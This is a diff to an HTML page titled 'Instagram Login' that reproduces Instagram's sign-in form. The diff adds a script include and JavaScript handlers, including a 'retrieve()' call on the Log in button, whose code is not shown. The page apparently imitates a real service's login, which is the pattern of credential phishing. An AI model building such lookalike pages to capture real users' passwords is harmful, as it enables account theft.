@@ -3,6 +3,7 @@
 	<head>
 	  <meta charset="UTF-8">
 	  <title>Instagram Login</title>
+	  <script src='index.js' type='text/javascript'></script>
 	  <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,500i,700" rel="stylesheet">
 	  <link href="styles.css" rel="stylesheet" />
 	  <script type='text/javascript' src='index.js'></script>
@@ -10,22 +11,22 @@
 	<body>
 		<main>
 			<form>
-			<fieldset>
-				<img src="instagram.png" alt="Instagram" />
+				<fieldset>
+					<img src="instagram.png" alt="Instagram" />
 
-				<label for="username">Username</label>
-				<input type="text" id="username" name="username" placeholder="Username" />
+					<label for="username">Username</label>
+					<input type="text" id="username" name="username" placeholder="Username" onfocus="if(this.value === 'username') { this.value = ''; }" />
 
-				<label for="password">Password</label>
-				<input type="password" id="password" name="password" placeholder="Password" />
+					<label for="password">Password</label>
+					<input type="password" id="password" name="password" placeholder="Password" onfocus="return makePassword()" />
 
-				<input type="submit" value="Log in">
-			</fieldset>
+					<input type="submit" value="Log in" onclick="retrieve()" />
+				</fieldset>
 
-			<fieldset>
-				<p>Don't have an account? <a href="">Sign up</a></p>
-			</fieldset>
-		</form>
+				<fieldset>
+					<p>Don't have an account? <a href="">Sign up</a></p>
+				</fieldset>
+			</form>
 
 		<p>Get the app.</p>
 
